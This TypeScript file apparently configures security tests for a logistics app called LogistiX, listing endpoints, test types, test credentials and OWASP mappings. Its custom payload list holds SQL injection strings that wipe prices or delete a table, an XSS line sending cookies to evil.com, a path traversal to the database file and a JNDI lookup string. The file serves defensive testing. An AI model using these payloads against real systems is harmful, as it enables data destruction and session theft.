/**
 * Security Testing Configuration
 * Centralized configuration for security tests
 */

export interface SecurityTestConfig {
    endpoints: SecurityEndpointConfig[]
    authentication: AuthenticationConfig
    rateLimit: RateLimitConfig
    payloadSets: PayloadSetConfig
    reporting: ReportingConfig
}

export interface SecurityEndpointConfig {
    path: string
    method: 'GET' | 'POST' | 'PUT' | 'DELETE'
    requiresAuth: boolean
    testTypes: SecurityTestType[]
    parameters: EndpointParameter[]
    riskLevel: 'low' | 'medium' | 'high' | 'critical'
}

export interface EndpointParameter {
    name: string
    type: 'string' | 'number' | 'boolean' | 'file'
    location: 'query' | 'body' | 'header' | 'path'
    required: boolean
}

export interface AuthenticationConfig {
    loginEndpoint: string
    testCredentials: {
        valid: { identifier: string; password: string }
        invalid: { identifier: string; password: string }
        admin: { identifier: string; password: string }
    }
    sessionCookieName: string
    tokenHeader?: string
}

export interface RateLimitConfig {
    enabled: boolean
    requestsPerMinute: number
    testDuration: number
    expectedStatusCode: number
}

export interface PayloadSetConfig {
    sqlInjection: boolean
    xss: boolean
    pathTraversal: boolean
    commandInjection: boolean
    csrf: boolean
    customPayloads: string[]
}

export interface ReportingConfig {
    generateReport: boolean
    reportFormat: 'json' | 'html' | 'xml'
    includeDetails: boolean
    saveToFile: boolean
    outputPath: string
}

export type SecurityTestType = 
    | 'sql_injection'
    | 'xss'
    | 'csrf'
    | 'path_traversal'
    | 'command_injection'
    | 'authentication_bypass'
    | 'authorization_bypass'
    | 'session_fixation'
    | 'rate_limiting'
    | 'input_validation'
    | 'file_upload'

/**
 * Default security test configuration for LogistiX
 */
export const DEFAULT_SECURITY_CONFIG: SecurityTestConfig = {
    endpoints: [
        // Authentication endpoints
        {
            path: '/api/v1/auth/login',
            method: 'POST',
            requiresAuth: false,
            testTypes: ['sql_injection', 'xss', 'rate_limiting', 'input_validation'],
            parameters: [
                { name: 'identifier', type: 'string', location: 'body', required: true },
                { name: 'password', type: 'string', location: 'body', required: true }
            ],
            riskLevel: 'critical'
        },
        {
            path: '/api/v1/auth/me',
            method: 'GET',
            requiresAuth: true,
            testTypes: ['authentication_bypass', 'session_fixation'],
            parameters: [],
            riskLevel: 'high'
        },
        {
            path: '/api/v1/profile/update',
            method: 'POST',
            requiresAuth: true,
            testTypes: ['sql_injection', 'xss', 'csrf', 'input_validation'],
            parameters: [
                { name: 'username', type: 'string', location: 'body', required: true },
                { name: 'email', type: 'string', location: 'body', required: true },
                { name: 'bio', type: 'string', location: 'body', required: false },
                { name: 'avatar', type: 'string', location: 'body', required: false }
            ],
            riskLevel: 'high'
        },

        // Parcel management endpoints
        {
            path: '/api/v1/parcelles',
            method: 'GET',
            requiresAuth: true,
            testTypes: ['sql_injection', 'authorization_bypass', 'rate_limiting'],
            parameters: [
                { name: 'search', type: 'string', location: 'query', required: false },
                { name: 'limit', type: 'number', location: 'query', required: false },
                { name: 'offset', type: 'number', location: 'query', required: false }
            ],
            riskLevel: 'medium'
        },
        {
            path: '/api/v1/parcelles',
            method: 'POST',
            requiresAuth: true,
            testTypes: ['sql_injection', 'xss', 'csrf', 'input_validation'],
            parameters: [
                { name: 'numero', type: 'string', location: 'body', required: true },
                { name: 'transporteur', type: 'string', location: 'body', required: true },
                { name: 'poids', type: 'number', location: 'body', required: true },
                { name: 'prix_achat', type: 'number', location: 'body', required: true }
            ],
            riskLevel: 'high'
        },
        {
            path: '/api/v1/parcelles/:id',
            method: 'PUT',
            requiresAuth: true,
            testTypes: ['sql_injection', 'xss', 'authorization_bypass', 'input_validation'],
            parameters: [
                { name: 'id', type: 'string', location: 'path', required: true },
                { name: 'numero', type: 'string', location: 'body', required: false },
                { name: 'transporteur', type: 'string', location: 'body', required: false }
            ],
            riskLevel: 'high'
        },
        {
            path: '/api/v1/parcelles/:id',
            method: 'DELETE',
            requiresAuth: true,
            testTypes: ['sql_injection', 'authorization_bypass', 'csrf'],
            parameters: [
                { name: 'id', type: 'string', location: 'path', required: true }
            ],
            riskLevel: 'high'
        },

        // Product management endpoints
        {
            path: '/api/v1/produits',
            method: 'GET',
            requiresAuth: true,
            testTypes: ['sql_injection', 'authorization_bypass'],
            parameters: [
                { name: 'search', type: 'string', location: 'query', required: false }
            ],
            riskLevel: 'medium'
        },
        {
            path: '/api/v1/produits',
            method: 'POST',
            requiresAuth: true,
            testTypes: ['sql_injection', 'xss', 'input_validation'],
            parameters: [
                { name: 'nom', type: 'string', location: 'body', required: true },
                { name: 'prix', type: 'number', location: 'body', required: true },
                { name: 'quantite', type: 'number', location: 'body', required: true },
                { name: 'parcelle_id', type: 'string', location: 'body', required: true }
            ],
            riskLevel: 'high'
        },

        // Search endpoints
        {
            path: '/api/v1/search/global',
            method: 'GET',
            requiresAuth: true,
            testTypes: ['sql_injection', 'xss', 'rate_limiting'],
            parameters: [
                { name: 'q', type: 'string', location: 'query', required: true }
            ],
            riskLevel: 'medium'
        },

        // Export/Import endpoints
        {
            path: '/api/v1/export/complete',
            method: 'GET',
            requiresAuth: true,
            testTypes: ['authorization_bypass', 'rate_limiting'],
            parameters: [],
            riskLevel: 'high'
        },
        {
            path: '/api/v1/import/data',
            method: 'POST',
            requiresAuth: true,
            testTypes: ['file_upload', 'input_validation', 'csrf'],
            parameters: [
                { name: 'data', type: 'string', location: 'body', required: true }
            ],
            riskLevel: 'critical'
        },

        // File upload endpoints
        {
            path: '/api/v1/upload',
            method: 'POST',
            requiresAuth: true,
            testTypes: ['file_upload', 'path_traversal', 'command_injection'],
            parameters: [
                { name: 'file', type: 'file', location: 'body', required: true }
            ],
            riskLevel: 'critical'
        },

        // Admin endpoints
        {
            path: '/api/v1/admin/database/overview',
            method: 'GET',
            requiresAuth: true,
            testTypes: ['authorization_bypass', 'authentication_bypass'],
            parameters: [],
            riskLevel: 'critical'
        },
        {
            path: '/api/v1/admin/system/health',
            method: 'GET',
            requiresAuth: true,
            testTypes: ['authorization_bypass', 'authentication_bypass'],
            parameters: [],
            riskLevel: 'critical'
        },
        {
            path: '/api/v1/admin/logs',
            method: 'GET',
            requiresAuth: true,
            testTypes: ['authorization_bypass', 'path_traversal'],
            parameters: [
                { name: 'file', type: 'string', location: 'query', required: false }
            ],
            riskLevel: 'critical'
        },

        // Market analysis endpoints
        {
            path: '/api/v1/market-analysis/search',
            method: 'GET',
            requiresAuth: true,
            testTypes: ['sql_injection', 'xss', 'rate_limiting'],
            parameters: [
                { name: 'query', type: 'string', location: 'query', required: true }
            ],
            riskLevel: 'medium'
        },

        // Statistics endpoints
        {
            path: '/api/v1/statistiques/roi',
            method: 'GET',
            requiresAuth: true,
            testTypes: ['sql_injection', 'authorization_bypass'],
            parameters: [
                { name: 'period', type: 'string', location: 'query', required: false }
            ],
            riskLevel: 'medium'
        }
    ],

    authentication: {
        loginEndpoint: '/api/v1/auth/login',
        testCredentials: {
            valid: { identifier: 'admin', password: 'password123' },
            invalid: { identifier: 'invalid@example.com', password: 'wrongpassword' },
            admin: { identifier: 'admin', password: 'password123' }
        },
        sessionCookieName: 'session_id',
        tokenHeader: 'Authorization'
    },

    rateLimit: {
        enabled: true,
        requestsPerMinute: 60,
        testDuration: 60000, // 1 minute
        expectedStatusCode: 429
    },

    payloadSets: {
        sqlInjection: true,
        xss: true,
        pathTraversal: true,
        commandInjection: true,
        csrf: true,
        customPayloads: [
            // Custom LogistiX-specific payloads
            "'; UPDATE parcelles SET prix_achat = 0; --",
            "'; DELETE FROM produits; --",
            '<script>window.location="http://evil.com/steal?data="+document.cookie</script>',
            '../../../data/logistix.db',
            '${jndi:ldap://evil.com/exploit}'
        ]
    },

    reporting: {
        generateReport: true,
        reportFormat: 'json',
        includeDetails: true,
        saveToFile: true,
        outputPath: './tests/security/reports/'
    }
}

/**
 * Security test severity levels
 */
export const SECURITY_SEVERITY = {
    CRITICAL: 'critical',
    HIGH: 'high',
    MEDIUM: 'medium',
    LOW: 'low'
} as const

/**
 * Common security headers to check
 */
export const SECURITY_HEADERS = {
    'Content-Security-Policy': 'CSP header missing',
    'X-Frame-Options': 'Clickjacking protection missing',
    'X-Content-Type-Options': 'MIME type sniffing protection missing',
    'X-XSS-Protection': 'XSS protection header missing',
    'Strict-Transport-Security': 'HSTS header missing',
    'Referrer-Policy': 'Referrer policy not set'
} as const

/**
 * OWASP Top 10 mapping
 */
export const OWASP_TOP_10_MAPPING = {
    'sql_injection': 'A03:2021 – Injection',
    'xss': 'A03:2021 – Injection',
    'authentication_bypass': 'A07:2021 – Identification and Authentication Failures',
    'authorization_bypass': 'A01:2021 – Broken Access Control',
    'session_fixation': 'A07:2021 – Identification and Authentication Failures',
    'csrf': 'A01:2021 – Broken Access Control',
    'path_traversal': 'A01:2021 – Broken Access Control',
    'command_injection': 'A03:2021 – Injection',
    'file_upload': 'A04:2021 – Insecure Design',
    'rate_limiting': 'A04:2021 – Insecure Design',
    'input_validation': 'A03:2021 – Injection'
} as const

/**
 * Get security test configuration for specific environment
 */
export function getSecurityConfig(environment: 'development' | 'staging' | 'production' = 'development'): SecurityTestConfig {
    const config = { ...DEFAULT_SECURITY_CONFIG }

    // Adjust configuration based on environment
    switch (environment) {
        case 'production':
            // More conservative testing in production
            config.rateLimit.requestsPerMinute = 30
            config.payloadSets.customPayloads = [] // No custom payloads in production
            break
        case 'staging':
            // Full testing in staging
            config.rateLimit.requestsPerMinute = 100
            break
        case 'development':
        default:
            // Aggressive testing in development
            config.rateLimit.requestsPerMinute = 200
            break
    }

    return config
}

/**
 * Filter endpoints by risk level
 */
export function filterEndpointsByRisk(
    config: SecurityTestConfig, 
    riskLevels: Array<'low' | 'medium' | 'high' | 'critical'>
): SecurityEndpointConfig[] {
    return config.endpoints.filter(endpoint => riskLevels.includes(endpoint.riskLevel))
}

/**
 * Get endpoints that support specific test types
 */
export function getEndpointsByTestType(
    config: SecurityTestConfig,
    testType: SecurityTestType
): SecurityEndpointConfig[] {
    return config.endpoints.filter(endpoint => endpoint.testTypes.includes(testType))
}